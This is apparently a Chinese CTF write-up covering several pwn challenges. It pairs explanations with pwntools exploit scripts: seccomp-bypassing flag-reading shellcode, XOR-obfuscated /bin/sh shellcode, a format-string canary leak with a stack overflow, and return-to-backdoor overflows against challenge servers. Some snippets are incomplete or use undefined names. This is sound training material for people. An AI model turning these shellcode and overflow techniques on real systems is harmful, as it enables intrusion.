# babypwn
### 解题思路
程序逻辑非常简单, 你写个shellcode, 帮你执行...
都告诉你了seccomp, 就不能搜一下ma : (
谷哥告诉我们, 这玩意相当于限制了系统调用, 再搜一下, 可以在github发现这个工具, 可以dump出未受限制的系统调用

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/1.png)

可以看到, 我们只能使用这几个系统调用来写shellcode, 也就是说不给你使用execve了

既然我们目的是想拿到flag那就把flag读出来不就完事了...

```python
from pwn import *
code = """
        xor ecx,ecx
        mov eax,SYS_open
        call here
        .string "./flag"
        .byte 0
        here:
        pop ebx
        int 0x80
        mov ebx,eax
        mov ecx,esp
        mov edx,0x100
        mov eax,SYS_read
        int 0x80
        mov ebx,1
        mov ecx,esp
        mov edx,0x100
        mov eax,SYS_write
        int 0x80
        mov eax,SYS_exit
        int 0x80
    """
shellcode=asm(code,arch="i386")
r=process("./pwn")
r.send(shellcode)
r.interactive()
```


# babyshellcode_plus
这题限制了shellcode不能在0-0x20(貌似是这样的), 正如题目描述所说, 这是@Lewis大哥叫我埋的坑, 请大家自行安排一下
### 解题思路

随便从网上抄一个shellcode运气好的话可以发现, 前面的shellcode都是符合要求的, 就是在syscall 的时候有个`\x0f\x05`这个玩意不好整, 其实也简单, 你xor一下写上去不就完事了

当然机灵的Msk同学就给我用msf生成了一个shellcode, 直接就把这个题的难度降低了m个档次, 也是一种方法啦

这是我的shellcode, 自行参考.
```python
code="""
xor  rsi,rsi
push rsi
mov  rdi,0x68732f2f6e69622f
push rdi
push rsp
pop  rdi
mov  al,0x3b
cdq
xor r8,r8
xor r9,r9
mov r8w,0x9c96
mov r9w,0x9999
xor r8,r9
xor rbp,rbp
mov ebp,0xdeacffe3
mov [rbp+0x50],r8
"""
```

# easy_pwn
这题是我手滑按错了, 不小心就提前放出来了来着...
### 解题思路
0x004008EB的函数可以让你控制printf的格式化字符串,我们可以用这个来泄露出栈上的一些值, 还给了你后门(不过我原本的exp是忘了用了的...), 0x400960的函数有个明显的栈溢出. 注意到程序开启了canary保护

那么我们就有一个很明显的利用思路了:
1. 可以printf leak出canary的地址
2. 利用栈溢出覆盖返回地址到后门地址

```python
# -*- coding:utf-8 -*-
from pwn import *
context.log_level = 'debug'
ip="111.198.29.45"
port="32405"
r = process(binary, aslr = 1)
#r = remote(ip,port)
sd = lambda x : r.send(x)
sl = lambda x : r.sendline(x)
ru = lambda x : r.recvuntil(x)
ia = lambda : r.interactive()

ru("Exit the battle \n")
sl("2")
sl("%23$p")
canary=int(rl()[:-1],16)
ru("Exit the battle \n")
sl("1")
payload='\x00'*0x88+p64(canary)+p64(0xdeadbeef)+p64(0x004008DA)
sd(payload)
ia()
```

# The First Overflow of A Young Man
read 处为溢出点，vuln函数中a与b都是在栈上的，a在b的下方，从a开始读入0x14个字符，多出的0x4个字符会溢出到b中，即可改变b的值
```c
   ------------------
b->             aaaa
   ------------------
a->aaaaaaaa aaaaaaaa
   ------------------   
```

nc 过去输入0x14个a即可

# The Second Overflow of A Young Man

scanf 处溢出，可用ida看s与函数的返回地址距离
```c
void __cdecl vuln()
{
  char s[16]; // [rsp+0h] [rbp-10h]   <-------

  puts("please input s:");
  __isoc99_scanf("%s", s);
}
```

即只需要覆盖0x14个字符后就到了函数的返回地址，再填入backdoor函数的地址即可

exp:
```python
from pwn import  *

context.log_level="debug"
# p = process("./overflow1")
p = remote("39.108.134.72", 1235)
backdoor =  0x400667
p.recv()
p.sendline(flat("a"  *  0x18, backdoor))

p.interactive()
```


# babyshellcode

无限制shellcode，直接用pwntools的shellcraft

```python
from pwn import  *

context(os="linux", arch="i386", log_level="debug")
filename =  "./babyshellcode"
addr =  "39.108.134.72"
port =  1236
REMOTE =  1
if REMOTE ==  0:
  p = process(filename)
else:
  p = remote(addr, port)

e = ELF(filename)

sd =  lambda  s="" : p.send(str(s))
sl =  lambda  s="" : p.sendline(str(s))
rc =  lambda  n=4096 : p.recv(n)
ru =  lambda  s="" : p.recvuntil(str(s))

sl(asm(shellcraft.sh()))

p.interactive()
```
